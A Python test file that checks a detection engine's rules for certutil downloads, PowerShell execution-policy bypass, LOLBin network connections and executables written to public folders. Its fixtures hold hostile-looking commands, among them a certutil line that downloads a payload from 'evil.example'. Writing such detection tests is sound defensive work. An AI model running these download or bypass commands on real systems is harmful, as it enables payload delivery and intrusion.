"""Day 8 verification (Pair 1): the rule set grows from 1 to 5 real rules
covering all 3 categories the engine supports, each verified to actually
fire (and not false-positive on benign activity) end-to-end through
rule_loader.load_rules() + engine.evaluate_event().
"""

from datetime import datetime, timezone

from app.detection import rule_loader
from app.detection.engine import evaluate_event
from app.schemas.event import NormalizedEvent


def _event(event_id, event_data):
    return NormalizedEvent(
        host="WORKSTATION01",
        timestamp=datetime(2026, 8, 18, tzinfo=timezone.utc),
        event_id=event_id,
        raw={},
        event_data=event_data,
    )


def test_load_rules_returns_at_least_five_rules():
    # Day 8's own guarantee (grew from 1 to 5) -- not an exact-count check,
    # since Day 9 legitimately grows this further to 10. The exact current
    # total is asserted in test_day9_detection_rules.py.
    rules = rule_loader.load_rules()
    assert len(rules) >= 5


def test_load_rules_covers_at_least_three_categories():
    rules = rule_loader.load_rules()
    categories = {r.category for r in rules}
    assert {"process_creation", "network_connection", "file_event"} <= categories


def test_certutil_urlcache_download_rule_fires():
    rules = rule_loader.load_rules()
    event = _event(
        1,
        {
            "Image": "C:\\Windows\\System32\\certutil.exe",
            "CommandLine": "certutil.exe -urlcache -split -f http://evil.example/payload.exe out.exe",
        },
    )

    matches = evaluate_event(event, rules)

    assert any(m.title == "Certutil Download via urlcache/split Flags" for m in matches)


def test_certutil_urlcache_download_rule_does_not_fire_on_benign_certutil():
    rules = rule_loader.load_rules()
    event = _event(
        1,
        {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -verify cert.pem"},
    )

    matches = evaluate_event(event, rules)

    assert not any(m.title == "Certutil Download via urlcache/split Flags" for m in matches)


def test_powershell_execution_policy_bypass_rule_fires():
    rules = rule_loader.load_rules()
    event = _event(
        1,
        {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File payload.ps1",
        },
    )

    matches = evaluate_event(event, rules)

    assert any(m.title == "PowerShell Execution Policy Bypass" for m in matches)


def test_powershell_execution_policy_bypass_rule_does_not_fire_on_benign_powershell():
    rules = rule_loader.load_rules()
    event = _event(
        1,
        {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -Command Get-Process",
        },
    )

    matches = evaluate_event(event, rules)

    assert not any(m.title == "PowerShell Execution Policy Bypass" for m in matches)


def test_lolbin_network_connection_rule_fires():
    rules = rule_loader.load_rules()
    event = _event(
        3,
        {
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "DestinationIp": "203.0.113.10",
            "DestinationPort": "443",
        },
    )

    matches = evaluate_event(event, rules)

    assert any(m.title == "Suspicious Network Connection from LOLBin" for m in matches)


def test_lolbin_network_connection_rule_does_not_fire_on_benign_process():
    rules = rule_loader.load_rules()
    event = _event(
        3,
        {
            "Image": "C:\\Windows\\System32\\svchost.exe",
            "DestinationIp": "239.255.255.250",
            "DestinationPort": "1900",
        },
    )

    matches = evaluate_event(event, rules)

    assert not any(m.title == "Suspicious Network Connection from LOLBin" for m in matches)


def test_suspicious_file_write_rule_fires():
    rules = rule_loader.load_rules()
    event = _event(
        11,
        {"TargetFilename": "C:\\Users\\Public\\update.exe"},
    )

    matches = evaluate_event(event, rules)

    assert any(m.title == "Suspicious Executable Written to Public or Temp Directory" for m in matches)


def test_suspicious_file_write_rule_does_not_fire_on_benign_path():
    rules = rule_loader.load_rules()
    event = _event(
        11,
        {"TargetFilename": "C:\\Users\\alice\\Documents\\report.docx"},
    )

    matches = evaluate_event(event, rules)

    assert not any(m.title == "Suspicious Executable Written to Public or Temp Directory" for m in matches)
